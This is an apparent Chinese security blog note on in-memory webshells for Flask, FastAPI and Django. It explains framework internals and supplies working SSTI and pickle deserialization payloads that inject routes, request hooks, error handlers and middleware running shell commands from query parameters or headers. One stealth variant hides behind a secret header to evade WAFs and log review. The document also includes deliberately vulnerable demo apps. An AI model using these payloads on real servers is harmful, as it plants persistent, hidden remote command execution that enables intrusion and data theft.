---
title: 各类 Python 框架下的内存马
description: Flask、Django、FastAPI 等框架下内存马的原理与实现
published: 2026-10-11
tags: [Python安全, 内存马, RCE]
category: 笔记
draft: false
---

# 各类 Python 框架下的内存马

在看到onehang整理的pyhon内存马总结的文章后想起来之前对flask框架下的内存马做了一点学习，所以参考他的文章对几种常见框架下的内存马进行了整理，并进行测试补充

内存马的核心思路：通过 SSTI / 反序列化等 RCE 点拿到**运行中的应用对象或注册表**，在不落盘的前提下把恶意函数挂进框架的请求处理链里（路由、钩子、中间件、异常处理器），之后正常访问就能触发命令执行，重启即失效

# Flask 内存马

## Flask 的核心对象

- `app.url_map`: 存储路由与视图函数的映射关系。
- `app.view_functions`: 存储视图函数的具体引用。
- `app.before_request_funcs` / `app.after_request_funcs`: 存储请求前/后的钩子函数。

在每次注册一个路由的时候，Flask 都会做两件事

往 `app.url_map` 里加一条 `Rule`

往 `app.view_functions` 里加一条 `endpoint → function`

比如

```
@app.route('/')
def index():
    return 'index'
```

相当于我们用app.add_url_rule往里面添加一个路由

```
app.add_url_rule('/', 'index', index)
```

此时 `add_url_rule` 内部会：

```
self.url_map.add(rule)                 # URL → endpoint
self.view_functions[endpoint] = view_func  # endpoint → 函数
```

所以每次访问/路由的时候就会先取出url_map中对应的endpoint 再根据endpoint去view_functions调用对应函数

## 路由型内存马

```
# 方法一：直接调用 add_url_rule (推荐，更稳定)
#Payload 1：通过 config 对象获取 app
{{config.__class__.__init__.__globals__['app'].add_url_rule('/shell', 'shell', lambda: __import__('os').popen(request.args.cmd).read())}}
#lambda: ...:视图函数，当路由被访问时执行的代码
#.popen(request.args.cmd)：从 URL 参数 cmd 获取命令并执行

# 或者通过 request 请求对象的应用代理中获取 app
{{request.application.__self__.add_url_rule('/shell2', 'shell2', lambda: __import__('os').popen(request.args.cmd).read())}}


# 方法二：低层次修改 url_map 和 view_functions (更底层)
# 1. 定义恶意函数，功能同上面的 lambda 函数。用普通函数而不是 lambda 的好处是可以添加更复杂的逻辑
def shell():
    return __import__('os').popen(request.args.cmd).read()
# 2. 获取 app 对象
app = request.application.__self__
# 3. 添加路由规则
from werkzeug.routing import Rule
app.url_map.add(Rule('/shell3', endpoint='shell3'))
# 4. 注册视图函数
app.view_functions['shell3'] = shell
```

然而在新版的flask中add_url_rule函数被多次check，不能重复调用add_url_rule

只能找其他的方式

![image-20260929173638865](/images/python-memshell/image-20260929173638865.png)

## 装饰器型/钩子内存马（或者叫中间件）

**原理**：不创建新的路由，而是利用 Flask 的钩子函数，如 `before_request`。before_request 在每次请求前执行，那恶意代码会在**每一次请求**处理前自动执行。这种方式比路由型更隐蔽，因为 URL 路径表中看不到新增的路由。

### before_request

![img](/images/python-memshell/3181170-20240509130843333-1796050029.png)

这个装饰器使得每次在发送请求时都会执行绑定的函数

我们跟进这个before_request

![img](/images/python-memshell/3181170-20240509130854801-296609756.png)


发现他自己调用了一个before_request_funcs.setdefault(None, []).append(f)

所以我们可以通过 `sys.modules["__main__"].__dict__["app"]` 获取 Flask 应用实例，进而操作 `before_request_funcs` ，使得f为我们的恶意函数，从而在每次请求发出前自动执行

```
eval("__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None,[]).append(lambda :__import__('os').popen(request.args.get("cmd").read())")
```

访问**该站点下的任意 URL**，带上参数 `?cmd=whoami` 即可执行命令

![image-20260929211528467](/images/python-memshell/image-20260929211528467.png)

**app.before_request_funcs**

这是Flask 内部的一个**大字典**，用来存放所有的“请求前”钩子

**setdefault(None, [])**

这是一个 Python 字典的常用方法，意思是：**“如果没有这个键，就先创建一个空的列表；如果有，就直接拿它的值。”**

**append**

添加函数

ssti时payload可以这样写

```
 {{ url_for.__globals__['__builtins__']['eval']('__import__("sys").modules["__main__"].__dict__["app"].before_request_funcs.setdefault(None,[]).append(lambda: __import__("os").popen(__import__("flask").request.args.get("cmd")).read() if __import__("flask").request.args.get("cmd") else None)') }}
```

或者把url_for换成下列变量

![image-20260929210828887](/images/python-memshell/image-20260929210828867.png)

### after_request

```
eval('__import__("sys").modules["__main__"].__dict__["app"].after_request_funcs.setdefault(None,[]).append(lambda resp: __import__("flask").make_response(__import__("os").popen(__import__("flask").request.args.get("cmd1")).read()) if request.args.get("cmd1") else resp)')
```

ssti中的payload

```
{{ url_for.__globals__['__builtins__']['eval']('__import__("sys").modules["__main__"].__dict__["app"].after_request_funcs.setdefault(None,[]).append(lambda resp: __import__("flask").make_response(__import__("os").popen(__import__("flask").request.args.get("cmdd")).read()) if __import__("flask").request.args.get("cmdd") else resp)') }}
```

![image-20260929212444516](/images/python-memshell/image-20260929212444516.png)

**为什么不像before_request一样直接在append后跟函数**

`before_request` 钩子的规则是：

- 返回 `None`：继续正常处理请求
- 返回非 `None`：**直接短路**，把这个返回值当作响应返回给客户端，不再进入视图函数

所以 `before_request` 里直接返回命令结果就行，简单直接。



`after_request` 的规则完全不同：

- **必须返回一个 `Response` 对象**（或兼容对象）`os.popen(cmd).read()` 返回的是普通字符串，不是 `Response` 对象
- 不能返回 `None`，否则 Flask 会报错
- 它接收原始响应 `resp` 作为参数，并返回处理后的响应

### error_handler

劫持错误处理器，使其执行代码

```
exec("global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()")
```

ssti版本

```
{{ url_for.__globals__['__builtins__']['exec']('import sys;app=sys.modules["__main__"].__dict__["app"];exc_class,code=app._get_exc_class_and_code(404);app.error_handler_spec.setdefault(None,{}).setdefault(code,{})[exc_class]=lambda a:__import__("os").popen(__import__("flask").request.args.get("levi")).read()', {})}}
```

![image-20260929213946189](/images/python-memshell/image-20260929213946189.png)

```
{{ url_for.__globals__['__builtins__']['exec']('import sys;app=sys.modules["__main__"].__dict__["app"];app.errorhandler(404)(lambda a:__import__("os").popen(__import__("flask").request.args.get("cmd4")).read())', {}) }}
```

注意这个调errorhandler api版本只在老版本可用 原因也是setupmethod拦截

#### 进阶版(payload)：带“暗号”的隐形后门

**逻辑**：

- 如果访问带有“暗号”（比如特定的 Header） -> 执行命令。
- 如果访问没有“暗号” -> 返回原来的 404 页面

为了在 SSTI 中能执行多行逻辑，我们通常不写一行 lambda，而是通过修改代码对象的常量（难度大）或者定义一个函数（需要多步执行）。

这里我们展示一种**直接使用闭包函数**的写法（假设是在 Python Shell 或者反序列化这种能执行多行代码的环境，SSTI 需要拆解）：

```python
# 1. 获取 app
app = request.application.__self__

# 2. 定义智能的恶意函数
def stealth_shell(error):
    # 检查 Header 里有没有 "X-Magic-Header"
    secret_cmd = request.headers.get('X-Magic-Header')

    if secret_cmd:
        # 如果有暗号，执行命令，并返回 200 状态码（伪装成正常响应）
        import os
        return os.popen(secret_cmd).read(), 200
    else:
        # 如果没有暗号，返回原始的错误信息
        # error 就是原本的 404 异常对象
        return error

# 3. 注册（替换原来的 404 处理器）
app.register_error_handler(404, stealth_shell)
```

`stealth_shell` 函数的精妙之处：

| 访问场景     | 请求内容                                   | 后门行为                 | 日志记录         | 外观表现             |
| ------------ | ------------------------------------------ | ------------------------ | ---------------- | -------------------- |
| **普通用户** | `GET /admin`(无Header)                     | 检测无暗号 -> 转发原错误 | `GET /admin 404` | **正常的 404 页面**  |
| **攻击者**   | `GET /admin`(Header: `X-Magic-Header: ls`) | 检测有暗号 -> 执行 `ls`  | `GET /admin 200` | **正常的文件列表**   |
| **扫描器**   | `GET /admin`(各种随机路径)                 | 检测无暗号 -> 转发原错误 | `... 404`        | **全是 404，像死链** |

**结果**：即便是最好的 WAF（Web应用防火墙）或者流量分析师，如果只看 URL 路径，会认为这只是一个普通的站点，用户正在输错地址。

在 SSTI中，我们很难写多行函数定义（因为 Jinja2 模板语法限制）。怎么实现上面的“带暗号”逻辑？

我们可以利用 **三元运算符** 压缩 lambda 函数：

```python
{{config.__class__.__init__.__globals__['app'].register_error_handler(404, lambda e: __import__('os').popen(request.headers.get('X-Cmd')).read() if request.headers.get('X-Cmd') else e)}}
A if condition else B
```

- **Condition**: `request.headers.get('X-Cmd')` (判断有没有 Header)
- **A (有暗号)**: `__import__('os').popen(...).read()` (执行命令)
- **B (无暗号)**: `e` (返回原来的异常对象)

## **pickle**利用下的payload:

### before_request

```
import os
import pickle
import base64
class A():
    def __reduce__(self):
        return (eval, ("__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda: __import__('os').popen(__import__('flask').request.args.get('cmd')).read() if __import__('flask').request.args.get('cmd') else None)",))

a = A()
print(base64.b64encode(pickle.dumps(a)))
```

手写opcode
```
import base64

# 使用 V 指令，不需要引号包裹，遇到换行符结束

# 这样 payload 里既可以有单引号也可以有双引号

opcode = b'''cbuiltins

exec

(V__import__("sys").modules["__main__"].__dict__["app"].before_request_funcs.setdefault(None, []).append(lambda: __import__("os").popen(__import__("flask").request.args.get("cmd")).read() if __import__("flask").request.args.get("cmd") else None)

tR.'''


payload = base64.b64encode(opcode).decode()

print(payload)
```

### after_request

```
import os
import pickle
import base64
class A():
    def __reduce__(self):
        return (eval, ("__import__('sys').modules['__main__'].__dict__['app'].after_request_funcs.setdefault(None, []).append(lambda resp: __import__('flask').make_response(__import__('os').popen(__import__('flask').request.args.get('cmd1')).read()) if __import__('flask').request.args.get('cmd1') else resp)",))

a = A()
print(base64.b64encode(pickle.dumps(a)))
```

### error_handler

```
import os
import pickle
import base64
class A():
    def __reduce__(self):
        return (exec, ("import sys;app=sys.modules['__main__'].__dict__['app'];exc_class,code=app._get_exc_class_and_code(404);app.error_handler_spec.setdefault(None,{}).setdefault(code,{})[exc_class]=lambda a: __import__('os').popen(__import__('flask').request.args.get('cmd2')).read()",))

a = A()
print(base64.b64encode(pickle.dumps(a)))
```

手写opcode
```
import base64

opcode = b'''cbuiltins
exec
(Vimport sys;app=sys.modules["__main__"].__dict__["app"];exc_class,code=app._get_exc_class_and_code(404);app.error_handler_spec.setdefault(None,{}).setdefault(code,{})[exc_class]=lambda a: __import__("os").popen(__import__("flask").request.args.get("cmd2")).read()
tR.'''

payload=base64.b64encode(opcode).decode()

print(payload)
```

# FastAPI 内存马

## 什么是 FastAPI ?

FastAPI 是一个现代的、快速（高性能）的 Web 框架，用于构建 API。它基于 Python 3.6+ 的类型提示，使用 Starlette 作为其底层 ASGI 框架，并使用 Pydantic 进行数据验证。

### 例子

```
from fastapi import FastAPI

app = FastAPI()

@app.get("/")
def read_root():
    return {"Hello": "World"}

@app.get("/items/{item_id}")
def read_item(item_id: int, q: str = None):
    return {"item_id": item_id, "q": q}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=9000)
```

### 解释

1. **导入 FastAPI**:

   `from fastapi import FastAPI`
   导入 FastAPI 框架

2. **创建 FastAPI 实例**:

   `app = FastAPI()`
   创建一个 FastAPI 应用实例

3. **定义路由**:

   - `@app.get("/")`: 定义根路由的处理函数，响应 GET 请求
   - `read_root()`: 根路由处理函数，返回一个 JSON 响应 `{"Hello": "World"}`。
   - `@app.get("/items/{item_id}")`: 定义带路径参数的路由
   - `read_item(item_id: int, q: str = None)`: 处理路径参数 `item_id` 和可选的查询参数 `q`，返回 JSON 响应。(在 FastAPI 里，函数参数默认会被当作**查询参数**处理)

4. **运行应用**:

   `if __name__ == "__main__": import uvicorn uvicorn.run(app, host="0.0.0.0", port=9000)`
   使用 Uvicorn 运行应用，监听 9000 端口。

### 运行应用

保存代码为 `main.py`，然后运行以下命令启动 FastAPI 应用：

```
uvicorn main:app --reload --port 9000
```

![image-20261009111622955](/images/python-memshell/image-20261009111622955.png)

带路由和查询参数的访问![image-20261009111931767](/images/python-memshell/image-20261009111931767.png)

FastAPI 会自动生成 API 文档，可以通过以下 URL 访问：

- **自动生成的文档**: `http://localhost:9000/docs`
- **原始文档**: `http://localhost:9000/redoc`

![image-20261009112025039](/images/python-memshell/image-20261009112025039.png)

![image-20261009112104663](/images/python-memshell/image-20261009112104663.png)

## SSTI下的利用

```
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
from jinja2 import Environment

app = FastAPI()
Jinja2 = Environment()

@app.get("/")
async def index():
    return {"message": "Hello World"}

@app.get("/hack")
async def hack(username="Guest"):
    output = Jinja2.from_string("Welcome " + username).render()
    return HTMLResponse(content=output)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, port=8000)
```

### 添加路由

在FastAPI中 add_api_route函数可用于添加路由

![image-20261010222906468](/images/python-memshell/image-20261010222906468.png)

这里一开始用

```
lipsum.__globals__['__builtins__']['eval'](
    "__import__('sys').modules['__main__'].__dict__['app'].router.add_api_route("
    "'/shell',"
    "lambda cmd='whoami': __import__('os').popen(cmd).read(),"
    "methods=['GET'])"
)
```

测试了很多遍没有成功

后面发现原因是我用uvicorn main:app --reload启动时app 在 main 模块而非 _\_main__ 中

所以把`__import__('sys').modules['__main__'].__dict__['app']`替换为` __import__('main').app`就可以了

```
{{lipsum.__globals__['__builtins__']['eval'](
    "__import__('main').app.router.add_api_route("
    "'/shell',"
    "lambda cmd='whoami': __import__('os').popen(cmd).read(),"
    "methods=['GET'])"
)}}
```

下次可用通用payload直接遍历找app

```
{{lipsum.__globals__['__builtins__']['eval']("[m.app.router.add_api_route('/shell',lambda cmd='whoami':__import__('os').popen(cmd).read(),methods=['GET']) for m in __import__('sys').modules.values() if hasattr(m,'app') and hasattr(getattr(m,'app',None),'router')]")}}
```





![image-20261010230118438](/images/python-memshell/image-20261010230118438.png)

### 异常处理器

和flask类似 FastAPI也有处理异常错误的装饰器 构造过程有一些复杂 具体链子的寻找可以参考[FastAPI 内存马的研究 - caterpie的小站](https://www.caterpie771.cn/archives/333#新路线探究：中间件和异常处理器)

这里直接给出exp

```
{{lipsum.__globals__['__builtins__']['eval'](
    "sys.modules['__main__'].app.middleware_stack.app.add_exception_handler(
          404,lambda request,exc:sys.modules['__main__'].app.__init__.__globals__['JSONResponse'](
              content={'message':__import__('os').popen(request.query_params.get('cmd') or 'whoami').read()}
          )
    )"
)}}
```

新版本由于中间件栈里多了一层所以middleware_stack.app要改成middleware_stack.app.app

```
{{lipsum.__globals__['__builtins__']['eval'](
    "sys.modules['__main__'].app.middleware_stack.app.app.add_exception_handler(
          404,lambda request,exc:sys.modules['__main__'].app.__init__.__globals__['JSONResponse'](
              content={'message':__import__('os').popen(request.query_params.get('cmd') or 'whoami').read()}
          )
    )"
)}}
```

### 中间件注入

利用 `exec` 函数，将 build_middleware_stack 的返回值赋给 app.middleware_stack，这样中间件堆栈就会重新生成，写入 `app.user_middleware` 的恶意中间件就成功插入了堆栈

同样的具体研究过程参考[FastAPI 内存马的研究 - caterpie的小站](https://www.caterpie771.cn/archives/333#对中间件与中间件堆栈的研究)

payload：

```
# 先向 user_middleware 写入恶意中间件
{{lipsum.__globals__['__builtins__']['exec'](
"app=sys.modules['__main__'].app
async def evil(request,call_next):
    global app
    return app.__init__.__globals__['JSONResponse'](
        content={'message':__import__('os').popen(request.query_params.get('cmd') or 'whoami').read()}
    )
app.user_middleware.insert(0,app.__init__.__globals__['Middleware'](
    app.__init__.__globals__['BaseHTTPMiddleware'],
    dispatch=evil
))"
)}}
# 然后重新构建 middleware_stack
{{lipsum.__globals__['__builtins__']['exec'](
  "app=sys.modules['__main__'].app;app.middleware_stack=app.build_middleware_stack()"
)}}
```

![image-20261010235949361](/images/python-memshell/image-20261010235949361.png)

## pickle 下的利用

和 Flask 一样，内存马的利用形式不仅限于 SSTI

### 添加路由

```
import pickle
import base64

payload = "sys.modules['__main__'].__dict__['app'].router.add_api_route('/shell',lambda cmd='whoami':__import__('os').popen(cmd).read(),methods=['GET'])"

class Evil():
    def __reduce__(self):
        return (eval,(payload,))

print(base64.b64encode(pickle.dumps(Evil())))
```

### 中间件

```
import pickle
import base64

payload = """app=sys.modules['__main__'].app
async def evil(request,call_next):
    global app
    return app.__init__.__globals__['JSONResponse'](
        content={'message':__import__('os').popen(request.query_params.get('cmd') or 'whoami').read()}
    )
app.user_middleware.insert(0,app.__init__.__globals__['Middleware'](
    app.__init__.__globals__['BaseHTTPMiddleware'],
    dispatch=evil
)
app.middleware_stack=app.build_middleware_stack()"""

class Evil():
    def __reduce__(self):
        return (exec,(payload,))

print(base64.b64encode(pickle.dumps(Evil())))
```

### 异常处理器

```
import pickle
import base64

payload = """app=sys.modules['__main__'].app
app.add_exception_handler(
    404,
    lambda request, exc:app.__init__.__globals__['JSONResponse'](
        content={'message':__import__('os').popen(request.query_params.get('cmd') or 'whoami').read()}
    )
)
app.middleware_stack=app.build_middleware_stack()"""

class Evil():
    def __reduce__(self):
        return (exec,(payload,))

print(base64.b64encode(pickle.dumps(Evil())))
```

# Django 内存马

## 什么是 Django ?

Django 是一个功能完备的 Python Web 框架，自带 ORM、路由、模板引擎、中间件、认证等组件。和 FastAPI/Flask 不同，Django 是 " MTV " 架构，一个标准项目由 `settings.py`（配置）、`urls.py`（根路由）、`views.py`（视图）、`wsgi.py`（WSGI 入口）等文件组成

### 例子

最小可测项目结构：

```
Django/
├── manage.py
└── demo/
    ├── __init__.py
    ├── settings.py
    ├── urls.py
    ├── views.py
    └── wsgi.py
```

```python
# settings.py 关键配置
DEBUG = False                          # 注意：必须是 False，否则 404 走调试页不走 handler404
ALLOWED_HOSTS = ["*"]
MIDDLEWARE = [
    "django.middleware.common.CommonMiddleware",
]
ROOT_URLCONF = "demo.urls"             # 根路由模块，内存马的关键操作对象
WSGI_APPLICATION = "demo.wsgi.application"  # 指向 wsgi.py，运行中的 handler 可从这拿到
```

```python
# views.py
from django.http import HttpResponse
from jinja2 import Environment

Jinja2 = Environment()

def index(request):
    return HttpResponse("Hello World")

def hack(request):
    # SSTI 漏洞点：用户输入直接拼进 Jinja2 模板
    username = request.GET.get("username", "Guest")
    output = Jinja2.from_string("Welcome " + username).render()
    return HttpResponse(output)

def unpickle(request):
    # 反序列化漏洞点：内存马的另一种入口
    import base64, pickle
    data = request.GET.get("data", "")
    try:
        obj = pickle.loads(base64.b64decode(data))
        return HttpResponse(str(obj))
    except Exception as e:
        return HttpResponse(f"err: {e}")
```

```python
# urls.py
from demo import views
from django.urls import path

urlpatterns = [
    path("", views.index),
    path("hack", views.hack),
    path("unpickle", views.unpickle),
]
```

```python
# wsgi.py
import os
from django.core.wsgi import get_wsgi_application

os.environ.setdefault("DJANGO_SETTINGS_MODULE", "demo.settings")
application = get_wsgi_application()
```

### 运行应用

```
cd Django
python manage.py runserver 9001 --noreload
```

Django 自带的模板引擎会拦截下划线开头的属性（`__class__` 之类取不到），所以这里和 FastAPI 篇一样直接用 Jinja2 做的 SSTI 点，`lipsum`、`url_for` 这些链子才能用

## Django 处理请求的核心对象

Django 请求生命周期里内存马可以挂的位置：

- **`urlpatterns`**：所有路由的注册表，启动时被 `URLResolver` 读取并缓存。
- **`settings.MIDDLEWARE`**：中间件白名单，在 `handler.load_middleware()` 时被读取构建成调用链。
- **`handler404` / `handler500`**（`ROOT_URLCONF` 模块的属性）：Django 处理 404/500 时通过 `resolver.resolve_error_handler()` 从 URLconf 模块**动态 getattr** 取的。

## SSTI下的利用

### 添加路由

往 `urlpatterns` 追加一条 `path`，再清掉 resolver 的 lru_cache：

```
{{lipsum.__globals__['__builtins__']['exec'](
"m=__import__('demo.urls',fromlist=['urlpatterns'])
m.urlpatterns.append(
    __import__('django.urls',fromlist=['path']).path(
        'shell',
        lambda request: __import__('django.http',fromlist=['HttpResponse']).HttpResponse(
            __import__('os').popen(request.GET.get('cmd') or 'whoami').read()
        )
    )
)
__import__('django.urls.resolvers',fromlist=['_get_cached_resolver'])._get_cached_resolver.cache_clear()"
)}}
```

**拿到根路由模块**

`  m=__import__('demo.urls',fromlist=['urlpatterns'])`

` __import__` 导入 `demo.urls`（就是 settings.py 里 ROOT_URLCONF 指的那个文件，所有路由都注册在这）![image-20261011195002397](/images/python-memshell/image-20261011195002397.png)

fromlist=['urlpatterns']  不加的话 `__import__('demo.urls')` 会只返回顶层的demo 包

**往路由表追加恶意路由**

```
m.urlpatterns.append(
    path('shell', lambda request: HttpResponse(os.popen(request.GET.get('cmd') or 'whoami').read()))
)
```

**清掉 URL 解析器缓存**

`  __import__('django.urls.resolvers',fromlist=['_get_cached_resolver'])._get_cached_resolver.cache_clear()`

  Django 为了性能，把解析 URL 的 URLResolver 实例放在 @lru_cache 里缓存着 如果只 append 不清缓存，Django
  用的还是旧的解析器访问 /shell 依然是 404 所以必须 cache_clear()

 Django 5 及以下缓存的函数叫 get_resolver，所以老文章里写的是 get_resolver.cache_clear()；Django 6 改名成了
  _get_cached_resolver，这行是对新版本的适配

![image-20261011194501962](/images/python-memshell/image-20261011194501962.png)

```
# 版本通用的清缓存写法（哪个带 lru_cache 就清哪个）
"r=__import__('django.urls.resolvers',fromlist=['x'])
for k in ('get_resolver','_get_cached_resolver'):
    f=r.__dict__.get(k)
    if f and hasattr(f,'cache_clear'): f.cache_clear()"
```

### 异常处理器

Django 抛 `Http404` 时

```python
def get_exception_response(request, resolver, status_code, exception):
    callback = resolver.resolve_error_handler(status_code)   # 动态 getattr
    response = callback(request, exception=exception)
```

 `URLResolver.resolve_error_handler` 是**每次请求都动态** `getattr(self.urlconf_module, "handler404")`，不做任何缓存.所以只需要往 URLconf 模块上挂一个 `handler404` 属性

```
{{lipsum.__globals__['__builtins__']['exec'](
"m=__import__('demo.urls',fromlist=['urlpatterns'])
def handler404(request, exception):
    return __import__('django.http',fromlist=['HttpResponse']).HttpResponse(
        __import__('os').popen(request.GET.get('cmd') or 'whoami').read()
    )
m.handler404 = handler404"
)}}
```

注入后任意不存在的路径都是 webshell

![image-20261011195537491](/images/python-memshell/image-20261011195537491.png)

需要注意settings.py中**必须设置 `DEBUG = False`**，DEBUG 模式下 404 走 `technical_404_response` 调试页面，不会查 handler404

### 中间件注入

Django 的中间件链由 `BaseHandler.load_middleware()` 根据 `settings.MIDDLEWARE` 构建——查看源码（`django/core/handlers/wsgi.py`）可以发现它在 `WSGIHandler.__init__` 里**启动时就构建好了**，之后处理请求只会反复调用 `self._middleware_chain(request)`，**运行时改 `settings.MIDDLEWARE` 不会有任何效果**。所以注入分三步

1. 定义恶意中间件类，并 `setattr` 到一个可 import 的模块上（`MIDDLEWARE` 列表里只能填 " 包名.类名 " 的字符串，`import_string` 会按字符串动态导入，exec 里定义的类必须先挂到模块属性上才导入得到）；
2. 把 `"django.http.EvilMW"` 插进 `settings.MIDDLEWARE`；
3. 对**运行中的 handler** 调一次 `load_middleware()` 重建调用链。

```
{{lipsum.__globals__['__builtins__']['exec'](
"import sys
class Evil:
    def __init__(self, get_response):
        self.get_response = get_response
    def __call__(self, request):
        return __import__('django.http',fromlist=['HttpResponse']).HttpResponse(
            __import__('os').popen(request.GET.get('cmd') or 'whoami').read()
        )
setattr(__import__('django.http',fromlist=['HttpResponse']),'EvilMW',Evil)
__import__('django.conf',fromlist=['settings']).settings.MIDDLEWARE.insert(0,'django.http.EvilMW')
sys.modules['demo.wsgi'].application.load_middleware()"
)}}
```

原理说明：

- `load_middleware()` 按 `reversed(settings.MIDDLEWARE)` 逐层包裹 `get_response`，所以 `insert(0, ...)` 的中间件最终位于**最外层**，请求一进来就短路返回，`call_next` 都不会被调用。想要隐蔽后门，可以在 `__call__` 里判断 `request.path` 或特定 Header，没有"暗号"时 `return self.get_response(request)` 放行。
- `load_middleware(is_async=False)` 默认构建同步链，WSGI 部署下没问题；ASGI（Daphne 等）部署时注意链是 async 的，测试时需要 `load_middleware(is_async=True)` 并把 `__call__` 写成 `async def`。
- `settings.MIDDLEWARE` 返回的就是 `settings.py` 里那个 list 对象本身，`insert` 是原地修改、不落盘；**服务重启后 settings 重新加载就没了**（配置文件没被写盘），这正是"内存马"的特点。

## pickle 下的利用

注入后用 `/unpickle?data=<base64>` 触发。

```python
import pickle
import base64

payload = """m=__import__('demo.urls',fromlist=['urlpatterns'])
m.urlpatterns.append(
    __import__('django.urls',fromlist=['path']).path(
        'shell',
        lambda request: __import__('django.http',fromlist=['HttpResponse']).HttpResponse(
            __import__('os').popen(request.GET.get('cmd') or 'whoami').read()
        )
    )
)
__import__('django.urls.resolvers',fromlist=['_get_cached_resolver'])._get_cached_resolver.cache_clear()"""

class Evil():
    def __reduce__(self):
        return (exec, (payload,))

print(base64.b64encode(pickle.dumps(Evil())))
```

handler404 版（`payload` 换成对应字符串）：

```python
payload = """m=__import__('demo.urls',fromlist=['urlpatterns'])
def handler404(request, exception):
    return __import__('django.http',fromlist=['HttpResponse']).HttpResponse(
        __import__('os').popen(request.GET.get('cmd') or 'whoami').read()
    )
m.handler404 = handler404"""
```

中间件版：

```python
payload = """import sys
class Evil:
    def __init__(self, get_response):
        self.get_response = get_response
    def __call__(self, request):
        return __import__('django.http',fromlist=['HttpResponse']).HttpResponse(
            __import__('os').popen(request.GET.get('cmd') or 'whoami').read()
        )
setattr(__import__('django.http',fromlist=['HttpResponse']),'EvilMW',Evil)
__import__('django.conf',fromlist=['settings']).settings.MIDDLEWARE.insert(0,'django.http.EvilMW')
sys.modules['demo.wsgi'].application.load_middleware()"""
```

---

# 参考文章

[Python内存马](https://r00t.yuque.com/org-wiki-r00t-ged7mn/knowledge_base/ukc10t3kgr9l8wx2)

[FastAPI 内存马的研究 - caterpie的小站](https://www.caterpie771.cn/archives/333#对中间件与中间件堆栈的研究)

[浅谈FastAPI框架下的内存马-先知社区](https://xz.aliyun.com/news/14938)

[Django Middleware 文档](https://docs.djangoproject.com/en/stable/topics/http/middleware/)

[Django URL dispatcher 文档（handler404/handler500）](https://docs.djangoproject.com/en/stable/topics/http/urls/#error-handling)
